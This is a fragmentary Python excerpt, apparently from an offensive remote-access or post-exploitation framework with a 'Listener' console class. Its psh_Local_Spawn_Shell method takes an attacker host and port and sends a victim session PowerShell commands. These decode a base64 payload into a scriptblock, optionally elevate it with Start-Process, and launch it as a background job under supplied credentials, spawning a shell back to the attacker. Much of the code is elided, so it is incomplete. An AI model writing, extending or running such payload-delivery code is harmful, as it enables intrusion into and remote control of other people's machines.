	...
	def confirm(text="", yes_is_default=True):
		while True:
			try:
				if yes_is_default:
					return (
						input("  \033[38;5;133m[?] " + text + " (Y/n): \033[0m").strip()
					).lower() not in ["n", "no"]
				else:
...
class Listener(object):
	...
	def cmd_complete(self, text, state):
		...
		for cmd in self.command_definition:
			...
			# Check for command
			if (
				cmd.startswith(text.split(" ")[0])
				and text.split(" ")[0] == cmd
	...
	def format_response(self, response):
		...
		for i in range(len(response)):
			if i == len(response) - 1:
				...
				if error:
					sys.stdout.write(
						"\n  \033[38;5;196m\033[48;5;16m"
						+ "\033[0m\n  \033[38;5;196m\033[48;5;16m".join(
							str(error[2]).strip().split("\n")
						)
						+ "\033[0m\n"
					)
	...
	def psh_Local_Spawn_Shell(self, payload_type):
		...
		if lhost != None and lport != None:		
			...
			sys.stdout.write(
				"\b" * Print.status(f"Checking integrity...{Print.wipe()}", True)
			)
			...
			if (self.framework.VariableSum(variable_name).lower() == hashlib.md5(payload).hexdigest().lower()):
				...
				# Invoke payload!
				self.check_command(
					f"${variable_name} = [scriptblock]::Create((new-object -TypeName System.Text.UTF8Encoding).GetString([Convert]::FromBase64String(${variable_name})))"
				)
				...
				if use_elevation:
					self.check_command(
						f"${variable_name}"
						+ " = [scriptblock]::Create(\"(Start-Process "
				...
				if credential_name is None:
					...
					self.check_command(
						f"Start-Job -Name {job_name} -ScriptBlock ${variable_name} -Credential ${credential_name}"
					)
